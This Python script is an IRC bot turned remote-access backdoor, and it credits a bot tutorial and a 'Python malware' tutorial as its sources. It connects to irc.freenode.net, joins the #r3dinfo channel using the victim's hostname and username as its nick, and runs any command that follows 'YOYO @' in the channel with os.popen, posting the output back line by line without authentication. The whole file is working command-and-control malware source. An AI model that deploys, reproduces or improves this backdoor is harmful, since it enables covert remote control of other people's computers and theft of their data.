# Author: r3dinfoguy
# Source code integrated from below mentioned links
# http://wiki.shellium.org/w/Writing_an_IRC_bot_in_Python
# http://www.primalsecurity.net/0xc-python-tutorial-python-malware/

import socket 
import getpass
import os
import time
import random
import re

# Set up our commands function
def commands(nick,channel,message):
   if message.find(botnick+': shellium')!=-1:
      ircsock.send('PRIVMSG %s :%s: Shellium is awesome!\r\n' % (channel,nick))
   elif message.find(botnick+': help')!=-1:
      ircsock.send('PRIVMSG %s :%s: My other command is shellium.\r\n' % (channel,nick))


	  
# Some basic variables used to configure the bot        
server = "irc.freenode.net" # Server
channel = "#r3dinfo" # Channel
botnick = socket.gethostname()+'-'+getpass.getuser() # Your bots nick


def ping(): # This is our first function! It will respond to server Pings.
  ircsock.send("PONG :pingis\n")  

def sendmsg(chan , msg): # This is the send message function, it simply sends messages to the channel.
  ircsock.send("PRIVMSG "+ chan +" :"+ msg +"\n") 

def joinchan(chan): # This function is used to join channels.
  ircsock.send("JOIN "+ chan +"\n")

def hello(): # This function responds to a user that inputs "Hello Mybot"
  ircsock.send("PRIVMSG "+ channel +" :Hello!\n")

def executecommand():
	command = ircmsg.split(' @')[1]
	channel = "#r3dinfo" # Channel
	
	
	output = os.popen(command).read()
	lines = re.split('\n',output)
	for line in lines:
		ircsock.send("PRIVMSG "+ channel +" :%s\n" % line)
		time.sleep(1)
	ircsock.send("PRIVMSG "+ channel +" :------ Command Completed --------\n")
                  
ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ircsock.connect((server, 6667)) # Here we connect to the server using the port 6667
ircsock.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :This bot is a result of a tutorial covered on http://shellium.org/wiki.\n") # user authentication
ircsock.send("NICK "+ botnick +"\n") # here we actually assign the nick to the bot

joinchan(channel) # Join the channel using the functions we previously defined

#ircsock.send("Host connected: "+socket.gethostname()+"\n")
#ircsock.send("Current User: "+getpass.getuser()+"\n")
while 1: # Be careful with these! it might send you to an infinite loop
  ircmsg = ircsock.recv(2048) # receive data from the server
  ircmsg = ircmsg.strip('\n\r') # removing any unnecessary linebreaks.
  print(ircmsg) # Here we print what's coming from the server
  hello = "welcome Sir"
  ircsock.send("PONG %s\r\n" % hello)
  #ircsock.send('PRIVMSG %s :%s: My other command is shellium.\r\n' % (channel,nick))
 
  if ircmsg.find(' PRIVMSG ')!=-1:
     nick=ircmsg.split('!')[0][1:]
     channel=ircmsg.split(' PRIVMSG ')[-1].split(' :')[0]
     commands(nick,channel,ircmsg)
  if ircmsg.find(":Hello "+ botnick) != -1: # If we can find "Hello Mybot" it will call the function hello()
    hello()

  if ircmsg.find("PING :") != -1: # if the server pings us then we've got to respond!
    ping()
  if ircmsg.find("YOYO @") !=-1:
    executecommand()
